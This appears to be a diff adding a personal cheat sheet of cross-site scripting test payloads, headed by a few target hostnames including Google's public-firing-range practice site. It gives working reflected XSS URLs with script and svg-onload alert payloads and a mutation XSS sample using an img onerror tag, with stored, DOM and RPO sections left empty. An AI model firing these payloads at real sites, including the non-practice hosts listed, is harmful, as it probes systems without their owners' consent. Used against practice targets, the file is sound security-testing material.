@@ -1,0 +1,23 @@
+http://public-firing-range.appspot.com
+http://businessinfo.co.uk/
+user-agent.me
+
+
+
+[Reflected XSS]
+
+http://public-firing-range.appspot.com/reflected/parameter/title?q=%3C/title%3E%3Csvg%20onload=alert%28%222%22%29%3E
+
+http://public-firing-range.appspot.com/reflected/parameter/title?q=<script>alert("Hacked")</script>
+
+
+[STORED XSS]
+
+
+[DOM XSS]
+
+[Mutation XSS - mXss]
+	<listing id=x>&lt;img src=1 onerror=alert(1)&gt;</listing>
+	<script>alert(document.getElementById('x').innerHTML)</script>
+
+[Relative Path overwrite XSS- RPO]
